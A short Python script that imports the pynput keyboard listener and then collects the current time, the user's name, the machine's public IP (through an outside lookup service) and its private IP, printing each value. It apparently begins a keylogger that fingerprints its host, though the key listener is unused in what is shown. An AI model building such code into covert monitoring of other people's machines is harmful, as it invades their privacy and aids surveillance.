from pynput.keyboard import Key, Listener
import time
import os
import requests
import socket

datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

print(datetime)
print(user)
print(publicIP)
print(privateIP)